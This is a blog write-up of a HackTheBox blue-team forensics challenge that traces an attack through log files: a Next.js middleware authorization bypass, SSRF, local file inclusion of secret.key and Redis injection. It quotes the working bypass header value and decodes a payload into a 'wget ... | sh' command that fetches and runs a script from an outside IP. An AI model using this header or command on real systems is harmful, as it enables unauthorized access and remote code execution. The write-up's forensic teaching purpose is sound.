+++
title = 'NeuroSync-D Sherlocks'
date = 2025-07-25T02:49:05-04:00
+++

# NeuroSync-D Sherlocks Challenge

![](/images/neurosync-d/neurosync-d.png)
*This is a write-up about the challenge NeuroSync-D, which is part of the Sherlocks challenges in HackTheBox focused on improving learners' proficiency in blue team security. As a web pentester, I honestly love investigating web attacks. Feels just like home, and this challenge was no different*

> Description: NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.

We are provided with 5 log files: access, bci-device, data-api, interface, and redis. We will navigate through all this throughout the investigation.

**Task 1: What version of Next.js is the application using?**
> Looking at the interface, we see the application loading and the Next.js version indicated
![](/images/neurosync-d/task1.png)

**Task 2: What local port is the Next.js-based application running on?**
> Just below the version, we can see the application running on port 3000

**Task 3: A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?**
> Digging through the interface logs and following the attack methodology of the attack, we can see an attack happening from 11:37:59. The attack is clearly the Next.js Middleware Authorization Bypass Attack, where the attacker added the x-middleware-subrequest header and added more values to make exceed the MAX_RECURSION_DEPTH, which is set to 5 max, achieving authorization. This, is CVE-2025-29927.
![](/images/neurosync-d/task3.png)

**Task 4: The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?**
> Looking at the access.log, we can see the attacker starts enumeration by sending requests to /next/static/chunks, a folder he knows exists. He gets a couple of 404s, but lands on a valid file: main-app.js
![](/images/neurosync-d/task4.png)

**Task 5: Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?**
> Just after finding that, we see he sends a request to /static/chunks/app/page.js, then gets an endpoint that he starts fully dealing with: /api/bci/analytics

**Task 6: How many requests to this endpoint have resulted in an "Unauthorized" response?**
> From the logs, we can see the attacker sending 5 requests that result in a 401 response, then gets a 200 response.
![](/images/neurosync-d/task6.png)

**Task 7: When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?**
> From the 200 in the screenshot above, we can see the first successful request being made at: 2025-04-01 11:38:05

**Task 8: Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?**
> Navigate to the interface logs. Match the time the requests where made and you can see them, where he was gradually adding middleware to the x-middleware-subrequest. Since the last unsuccessful request was ["x-middleware-subrequest","middleware:middleware:middleware:middleware"], and we know the MAX_RECURSION_DEPTH is usually 5, hence the next exploited the endpoint successfully: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
![](/images/neurosync-d/task8.png)

**Task 9: The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?**
> Looking at the data-api.log, we see the api being accessed and bruteforced. It exists on port 4000 as seen
![](/images/neurosync-d/task9.png)

**Task 10: After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?**
> From the above screenshot, the logs show that the bruteforce was successful on the endpoint /logs, and log file is read successfully.

**Task 11: When the vulnerable endpoint found was used maliciously for the first time?**
> Just below it was found, we see the attacker performing a local file inclusion attack on the endpoint, exactly at: 2025-04-01 11:39:01

**Task 12: What is the attack name the endpoint is vulnerable to?**
> Well, that's a nobrainer is it? Local File Inclusion

**Task 13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?**
> The attacker tries a couple of files before landing on the last and successful one, secret.key
![](/images/neurosync-d/task13.png)

**Task 14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?**
> Since this was perfomed on the Redis server, go to the redis.log and observe the unusual commands. We find the following: OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
![](/images/neurosync-d/task14.png)

**Task 15: Once decoded, what is the command?**
> Go to [Cybechef](https://gchq.github.io/CyberChef) and decode this. Or if you like the terminal just as you like me, decode this by simply:
> 
```
┌──(kali㉿kali)-[~]
└─$ echo "d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo" | base64 -d                                                                                           
wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
```

Such an amazing challenge fr fr!!👽😎